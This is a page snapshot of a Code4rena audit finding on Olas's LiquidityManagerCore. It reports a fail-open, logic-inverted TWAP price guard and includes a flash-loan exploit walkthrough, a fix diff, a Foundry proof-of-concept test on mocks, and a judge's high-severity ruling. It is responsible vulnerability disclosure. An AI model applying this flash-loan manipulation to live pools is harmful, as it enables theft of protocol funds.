@@ -1,0 +1,384 @@
+uid=11_0 RootWebArea "Critical Logic Inversion in Price Guard Allows Fla... / F-204" url="https://code4rena.com/audits/2026-01-olas/submissions/F-204"
+  uid=11_1 navigation
+    uid=11_2 link "Navigate to home" url="https://code4rena.com/"
+      uid=11_3 image "C4 Logo" url="https://code4rena.com/images/c4-logo-icon.svg"
+    uid=11_4 button "Open notifications" expandable
+    uid=11_5 link "News" url="https://code4rena.com/"
+      uid=11_6 image "News" url="https://code4rena.com/icon/megaphone/32.svg"
+      uid=11_7 StaticText "News"
+    uid=11_8 link "Leaderboard" url="https://code4rena.com/leaderboard"
+      uid=11_9 StaticText "Leaderboard"
+    uid=11_10 link "Submissions" url="https://code4rena.com/your-submissions"
+      uid=11_11 StaticText "Submissions"
+    uid=11_12 StaticText "Explore C4"
+    uid=11_13 link "Audits" url="https://code4rena.com/audits"
+      uid=11_14 StaticText "Audits"
+    uid=11_15 link "Bounties" url="https://code4rena.com/bounties"
+      uid=11_16 StaticText "Bounties"
+    uid=11_17 link "Reports" url="https://code4rena.com/reports"
+      uid=11_18 StaticText "Reports"
+    uid=11_19 link "Support" url="https://code4rena.com/help"
+      uid=11_20 StaticText "Support"
+    uid=11_21 StaticText "Resources"
+    uid=11_22 link "Docs (opens in new window)" url="https://docs.code4rena.com/"
+      uid=11_23 StaticText "Docs"
+    uid=11_24 link "Terms (opens in new window)" url="https://docs.code4rena.com/legal/terms-of-service"
+      uid=11_25 StaticText "Terms"
+    uid=11_26 link "Privacy (opens in new window)" url="https://docs.code4rena.com/legal/privacy-policy"
+      uid=11_27 StaticText "Privacy"
+    uid=11_28 button "User Options"
+  uid=11_29 button "Collapse sidebar" expandable expanded
+  uid=11_30 main
+    uid=11_31 link "Submissions" url="https://code4rena.com/audits/2026-01-olas/submissions"
+      uid=11_32 StaticText "Submissions"
+    uid=11_33 image "Olas" url="https://code4rena.com/_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-QWgFHq8826A&w=32&q=75"
+    uid=11_34 link "Olas" url="https://code4rena.com/audits/2026-01-olas/dashboard"
+      uid=11_35 StaticText "Olas"
+    uid=11_36 StaticText "/"
+    uid=11_37 StaticText "F-204"
+    uid=11_38 button "High"
+    uid=11_39 StaticText "Primary"
+    uid=11_40 link "S-347" url="https://code4rena.com/audits/2026-01-olas/submissions/S-347"
+      uid=11_41 StaticText "S-"
+      uid=11_42 StaticText "347"
+    uid=11_43 button
+    uid=11_44 link "Critical Logic Inversion in Price Guard Allows Flash-Loan Manipulation of Liquidity Operations" url="https://code4rena.com/audits/2026-01-olas/submissions/S-347"
+      uid=11_45 StaticText "Critical Logic Inversion in Price Guard Allows Flash-Loan Manipulation of Liquidity Operations"
+    uid=11_46 image "Avatar for prazzix86" url="https://code4rena.com/_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fprazzix86&w=32&q=75"
+    uid=11_47 link "prazzix86" url="https://code4rena.com/@prazzix86"
+      uid=11_48 StaticText "prazzix86"
+    uid=11_49 button "Sufficient"
+    uid=11_50 button "39d ago"
+    uid=11_51 button
+    uid=11_52 heading "Finding description and impact" level="2"
+    uid=11_53 StaticText "The "
+    uid=11_54 StaticText "checkPoolAndGetCenterPrice"
+    uid=11_55 StaticText " function in "
+    uid=11_56 StaticText "LiquidityManagerCore.sol"
+    uid=11_57 StaticText " is intended to be a security gate that prevents the protocol from interacting with Uniswap V3 pools at manipulated "instant" prices. It is designed to verify the slot0 price against a 30-minute Time-Weighted Average Price (TWAP)."
+    uid=11_58 StaticText "However, two critical flaws in the implementation render this protection completely ineffective:"
+    uid=11_59 heading "1. Logic Inversion in History Check (Mature Pools)" level="3"
+    uid=11_60 StaticText "The contract uses the following check to decide whether to bypass the TWAP verification:"
+    uid=11_61 StaticText "1104: if (oldestTimestamp + SECONDS_AGO < block.timestamp) {
+1105:     return centerSqrtPriceX96; 
+1106: }
+"
+    uid=11_62 StaticText "In Uniswap V3, "
+    uid=11_63 StaticText "oldestTimestamp"
+    uid=11_64 StaticText " is the timestamp of the earliest recorded price point in the observation buffer."
+    uid=11_65 StaticText "If the pool is mature"
+    uid=11_66 StaticText " (has ≥ 30 mins of history), the condition "
+    uid=11_67 StaticText "oldestTimestamp + 1800 < block.timestamp"
+    uid=11_68 StaticText " is TRUE."
+    uid=11_69 LineBreak "
+"
+    uid=11_70 StaticText "The Result"
+    uid=11_71 StaticText ": The function returns the untrusted slot0 price immediately, bypassing the TWAP check for exactly the pools that have sufficient data to be checked."
+    uid=11_72 heading "2. Fail-Open Architecture on Verification Failure (New Pools)" level="3"
+    uid=11_73 StaticText "If the pool is new (history < 30 mins), the code proceeds to call "
+    uid=11_74 StaticText "getTwapFromOracle"
+    uid=11_75 StaticText ". This call will typically revert because the Uniswap observe function requires data reaching back the full SECONDS_AGO period."
+    uid=11_76 StaticText "1111: (bool success, bytes memory returnData) = address(this).staticcall(payload);
+1112: 
+1113: // If the call has failed - observe was not successful...
+1114: if (!success) {
+1115:     return centerSqrtPriceX96;
+1116: }
+"
+    uid=11_77 StaticText "Instead of reverting (Fail-Closed), the protocol "
+    uid=11_78 StaticText "catches the error and returns the untrusted price"
+    uid=11_79 StaticText ". This creates a trivial bypass: an attacker can create a new pool, manipulate its price, and the protocol will use that manipulated price because the "security check" failed to execute."
+    uid=11_80 heading "Step-by-Step Exploit Scenario" level="3"
+    uid=11_81 StaticText "Preparation"
+    uid=11_82 StaticText ": Attacker identifies a liquidity operation (e.g., ConvertedToV3)."
+    uid=11_83 LineBreak "
+"
+    uid=11_84 StaticText "Manipulation"
+    uid=11_85 StaticText ": Attacker creates a fresh Uniswap V3 pool for OLAS / SHITCOIN."
+    uid=11_86 LineBreak "
+"
+    uid=11_87 StaticText "Flash Loan"
+    uid=11_88 StaticText ": Attacker uses a flash loan to buy OLAS in this new pool, pushing the slot0 price to 100x the fair market value."
+    uid=11_89 LineBreak "
+"
+    uid=11_90 StaticText "Protocol Trigger"
+    uid=11_91 StaticText ": Attacker triggers the protocol to provide liquidity to this pool."
+    uid=11_92 LineBreak "
+"
+    uid=11_93 StaticText "Bypass:"
+    uid=11_94 StaticText "checkPoolAndGetCenterPrice is called."
+    uid=11_95 StaticText "The pool is new, so it tries getTwapFromOracle."
+    uid=11_96 LineBreak "
+"
+    uid=11_97 StaticText "observe([1800, 0]) reverts because the pool is only seconds old."
+    uid=11_98 StaticText "The protocol catches the revert and returns the 100x manipulated slot0 price."
+    uid=11_99 LineBreak "
+"
+    uid=11_100 StaticText "Profit"
+    uid=11_101 StaticText ": The protocol mints a position or converts tokens based on the 100x price, allowing the attacker to effectively drain OLAS from the protocol in exchange for worthless tokens."
+    uid=11_102 heading "Impact" level="2"
+    uid=11_103 StaticText "This is a Critical severity issue as it breaks the primary security assumption for price safety in the Protocol-Owned Liquidity (POL) module. It allows for the total drainage of assets committed to V3 liquidity operations via standard flash-loan price manipulation."
+    uid=11_104 heading "Recommended mitigation steps" level="2"
+    uid=11_105 StaticText "The protocol should adopt a Fail-Closed security model and correct the history logic:"
+    uid=11_106 StaticText "-        if (oldestTimestamp + SECONDS_AGO < block.timestamp) {
+-            return centerSqrtPriceX96;
+-        }
++        // Ensure the pool is mature enough to have TWAP data
++        if (oldestTimestamp + SECONDS_AGO > block.timestamp) {
++            revert PoolTooNew();
++        }
+ 
+         uint256 twapPrice;
+         bytes memory payload = abi.encodeCall(this.getTwapFromOracle, (pool));
+         (bool success, bytes memory returnData) = address(this).staticcall(payload);
+ 
+-        if (!success) {
+-            return centerSqrtPriceX96;
+-        }
++        require(success, "TWAP check failed");
+"
+    uid=11_107 heading "Proof of Concept" level="2"
+    uid=11_108 StaticText "// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.30;
+
+import "forge-std/Test.sol";
+import "../contracts/pol/LiquidityManagerCore.sol";
+
+// Mock implementation to expose the internal logic
+contract LiquidityManagerMock is LiquidityManagerCore {
+    constructor(
+        address _olas, 
+        address _treasury, 
+        address _pm, 
+        address _scanner, 
+        uint16 _card
+    ) LiquidityManagerCore(_olas, _treasury, _pm, _scanner, _card) {
+        _locked = 1;
+    }
+
+    // Implement abstract functions
+    function _burn(uint256) internal override {}
+    
+    function _checkTokensAndRemoveLiquidityV2(address[] memory, bytes32) 
+        internal 
+        override 
+        returns (uint256[] memory amounts) 
+    {
+        amounts = new uint256[](2);
+    }
+    
+    function _feeAmountTickSpacing(int24) internal view override returns (int24 tickSpacing) {
+        return 0;
+    }
+    
+    function _getV3Pool(address[] memory, int24) internal view override returns (address v3Pool) {
+        return address(0);
+    }
+    
+    function _mintV3(
+        address[] memory,
+        uint256[] memory,
+        uint256[] memory,
+        int24[] memory,
+        int24,
+        uint160
+    ) internal override returns (uint256 positionId, uint128 liquidity, uint256[] memory amountsIn) {
+        return (0, 0, new uint256[](2));
+    }
+
+    // Helper to simulate the internal check
+    function test_checkPoolAndGetCenterPrice(address pool) external view returns (uint160) {
+        return checkPoolAndGetCenterPrice(pool);
+    }
+}
+
+contract TwapExploitTest is Test {
+    LiquidityManagerMock manager;
+    address constant OLAS = address(0x111);
+    address constant TREASURY = address(0x222);
+    address constant POOL = address(0x333);
+
+    function setUp() public {
+        // Warp to a realistic time to avoid underflows when subtracting SECONDS_AGO
+        vm.warp(1000000);
+
+        // Provide bytecode to the mock addresses so staticcalls don't fail
+        vm.etch(address(0xdead), "bytecode");
+        vm.etch(address(0xbeef), "bytecode");
+        
+        // Mock the factory() call that happens in the constructor
+        vm.mockCall(
+            address(0xdead),
+            abi.encodeWithSignature("factory()"),
+            abi.encode(address(0xfac))
+        );
+
+        manager = new LiquidityManagerMock(
+            OLAS, 
+            TREASURY, 
+            address(0xdead), // positionManagerV3
+            address(0xbeef), // neighborhoodScanner
+            1                // observationCardinality
+        );
+    }
+
+    function testPoC_PriceGuardBypassOnNewPool() public {
+        // 1. Setup a manipulated price in slot0
+        uint160 manipulatedPrice = 79228162514264337593543950336 * 10; 
+        
+        // 2. Mock slot0
+        vm.mockCall(
+            POOL,
+            abi.encodeWithSignature("slot0()"),
+            abi.encode(manipulatedPrice, int24(0), uint16(5), uint16(0), uint16(0), uint8(0), bool(false))
+        );
+
+        // 3. Mock the observations to show the pool is very new (only 60s old)
+        uint32 poolCreationTime = uint32(block.timestamp - 60);
+        vm.mockCall(
+            POOL,
+            abi.encodeWithSignature("observations(uint256)", 5),
+            abi.encode(poolCreationTime, int56(0), uint160(0), bool(true))
+        );
+
+        // 4. Mock the TWAP call to REVERT
+        uint32[] memory secondsAgo = new uint32[](2);
+        secondsAgo[0] = 1800;
+        vm.mockCallRevert(
+            POOL,
+            abi.encodeWithSignature("observe(uint32[])", secondsAgo),
+            "OLD"
+        );
+
+        // 5. Execute the check
+        uint160 finalPrice = manager.test_checkPoolAndGetCenterPrice(POOL);
+
+        // 6. Verification
+        assertEq(finalPrice, manipulatedPrice);
+        console.log("PoC Success: Price guard bypassed on new pool. Final Price:", finalPrice);
+    }
+
+    function testPoC_PriceGuardBypassOnMaturePool() public {
+        // 1. Setup a manipulated price in slot0
+        uint160 manipulatedPrice = 79228162514264337593543950336 * 10; 
+        
+        // 2. Mock slot0
+        vm.mockCall(
+            POOL,
+            abi.encodeWithSignature("slot0()"),
+            abi.encode(manipulatedPrice, int24(0), uint16(5), uint16(0), uint16(0), uint8(0), bool(false))
+        );
+
+        // 3. Mock the observations to show the pool is MATURE (e.g., 1 hour old)
+        uint32 poolCreationTime = uint32(block.timestamp - 3600);
+        vm.mockCall(
+            POOL,
+            abi.encodeWithSignature("observations(uint256)", 5),
+            abi.encode(poolCreationTime, int56(0), uint160(0), bool(true))
+        );
+
+        // 4. Execute the check
+        uint160 finalPrice = manager.test_checkPoolAndGetCenterPrice(POOL);
+
+        // 5. Verification
+        assertEq(finalPrice, manipulatedPrice);
+        console.log("PoC Success: Price guard bypassed on mature pool due to logic inversion.");
+    }
+}
+"
+    uid=11_109 heading "Links to affected code" level="4"
+    uid=11_110 link "LiquidityManagerCore.sol#L1104-L1116 Opens in a new window" url="https://github.com/valory-xyz/autonolas-tokenomics/blob/bbec5ac12721a62672fb7a5ffba5c40f5a46d8cb/contracts/pol/LiquidityManagerCore.sol#L1104-L1116"
+      uid=11_111 StaticText "LiquidityManagerCore.sol#L1104-L1116"
+      uid=11_112 StaticText "Opens in a new window"
+    uid=11_113 heading "Submissions touching same files" level="4"
+    uid=11_114 button "LiquidityManagerCore.sol"
+    uid=11_115 button "View full submission"
+    uid=11_116 StaticText "Comments for the judge"
+    uid=11_117 StaticText "1"
+    uid=11_118 StaticText "You are viewing comments for the"
+    uid=11_119 StaticText " "
+    uid=11_120 StaticText "primary submission"
+    uid=11_121 StaticText ","
+    uid=11_122 StaticText " "
+    uid=11_123 StaticText "S-347"
+    uid=11_124 StaticText "."
+    uid=11_125 StaticText "Judge Comments"
+    uid=11_126 StaticText "Mar 11"
+    uid=11_127 button expandable haspopup="menu"
+    uid=11_128 image "Avatar for 0xnev" url="https://code4rena.com/_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2F0xnev&w=48&q=75"
+    uid=11_129 StaticText "0xnev"
+    uid=11_130 StaticText "While no OLAS/WETH univ3 pool currently exist, taking the current "
+    uid=11_131 link "OLAS/WETH v2 pool" url="https://code4rena.com/audits/2026-01-olas/submissions/0x0001A500A6B18995B03f44bb040A5fFc28E45CB0"
+      uid=11_132 StaticText "OLAS/WETH v2 pool"
+    uid=11_133 StaticText ", there are instances where there are no activity for >30 mins"
+    uid=11_134 StaticText "Since it can allow for an incorrect "
+    uid=11_135 StaticText "checkPoolAndGetCenterPrice"
+    uid=11_136 StaticText " returned "
+    uid=11_137 StaticText "centerSqrtPriceX96 "
+    uid=11_138 StaticText ", combined with hardcoded slippages in the buy back burner contract, it can cause sandwich losses during OLAS token buybacks on a V3 dex, and as such, I would agree with high severity here"
+    uid=11_139 StaticText "Duplicates"
+    uid=11_140 StaticText "5"
+    uid=11_141 StaticText "S-"
+    uid=11_142 StaticText "1254"
+    uid=11_143 button
+    uid=11_144 link "checkPoolAndGetCenterPrice() uses newest observation instead of oldest" url="https://code4rena.com/audits/2026-01-olas/submissions/S-1254"
+      uid=11_145 StaticText "checkPoolAndGetCenterPrice() uses newest observation instead of oldest"
+    uid=11_146 image "Avatar for M4v3r1ck" url="https://code4rena.com/_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2FM4v3r1ck&w=32&q=75"
+    uid=11_147 link "M4v3r1ck" url="https://code4rena.com/@M4v3r1ck"
+      uid=11_148 StaticText "M4v3r1ck"
+    uid=11_149 button
+    uid=11_150 StaticText "S-"
+    uid=11_151 StaticText "868"
+    uid=11_152 button
+    uid=11_153 link "LiquidityManagerCore: TWAP oracle bypass via wrong observation index + changeMaxSlippage missing upper bound allows DoS" url="https://code4rena.com/audits/2026-01-olas/submissions/S-868"
+      uid=11_154 StaticText "LiquidityManagerCore: TWAP oracle bypass via wrong observation index + changeMaxSlippage missing upper bound allows DoS"
+    uid=11_155 image "Avatar for ayazwx" url="https://code4rena.com/_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fayazwx&w=32&q=75"
+    uid=11_156 link "ayazwx" url="https://code4rena.com/@ayazwx"
+      uid=11_157 StaticText "ayazwx"
+    uid=11_158 button
+    uid=11_159 StaticText "S-"
+    uid=11_160 StaticText "1144"
+    uid=11_161 button
+    uid=11_162 link "Incorrect observation index used to determine TWAP history availability" url="https://code4rena.com/audits/2026-01-olas/submissions/S-1144"
+      uid=11_163 StaticText "Incorrect observation index used to determine TWAP history availability"
+    uid=11_164 image "Avatar for Nyx" url="https://code4rena.com/_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2FNyx&w=32&q=75"
+    uid=11_165 link "Nyx" url="https://code4rena.com/@Nyx"
+      uid=11_166 StaticText "Nyx"
+    uid=11_167 button "47"
+    uid=11_168 button
+    uid=11_169 StaticText "S-"
+    uid=11_170 StaticText "1101"
+    uid=11_171 button
+    uid=11_172 link "Reversed Logic in TWAP Time Window Check Leads to Incorrect Price Return" url="https://code4rena.com/audits/2026-01-olas/submissions/S-1101"
+      uid=11_173 StaticText "Reversed Logic in TWAP Time Window Check Leads to Incorrect Price Return"
+    uid=11_174 image "Avatar for jkk812812" url="https://code4rena.com/_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fjkk812812&w=32&q=75"
+    uid=11_175 link "jkk812812" url="https://code4rena.com/@jkk812812"
+      uid=11_176 StaticText "jkk812812"
+    uid=11_177 button "44"
+    uid=11_178 button
+    uid=11_179 StaticText "S-"
+    uid=11_180 StaticText "1097"
+    uid=11_181 button
+    uid=11_182 link "Incorrect Observation Index Retrieval Returns Latest Instead of Oldest Price" url="https://code4rena.com/audits/2026-01-olas/submissions/S-1097"
+      uid=11_183 StaticText "Incorrect Observation Index Retrieval Returns Latest Instead of Oldest Price"
+    uid=11_184 image "Avatar for jkk812812" url="https://code4rena.com/_next/image?url=https%3A%2F%2Fapi-v1.code4rena.com%2Favatars%2Fjkk812812&w=32&q=75"
+    uid=11_185 link "jkk812812" url="https://code4rena.com/@jkk812812"
+      uid=11_186 StaticText "jkk812812"
+    uid=11_187 button "44"
+    uid=11_188 button
+    uid=11_189 StaticText "Timeline"
+    uid=11_190 StaticText "Submitted"
+    uid=11_191 StaticText "Created: 83d ago"
+    uid=11_192 button "High"
+    uid=11_193 StaticText "Review"
+    uid=11_194 StaticText "Judging"
+    uid=11_195 button "High"
+    uid=11_196 button "Valid"
+    uid=11_197 button "Primary"
+    uid=11_198 button "Sufficient"
+    uid=11_199 StaticText "Post-judging QA"
+    uid=11_200 StaticText "Complete"
+    uid=11_201 StaticText "Reporting"
+    uid=11_202 StaticText "In progress"
+    uid=11_203 button
+  uid=11_204 alert atomic live="assertive" relevant="additions text"
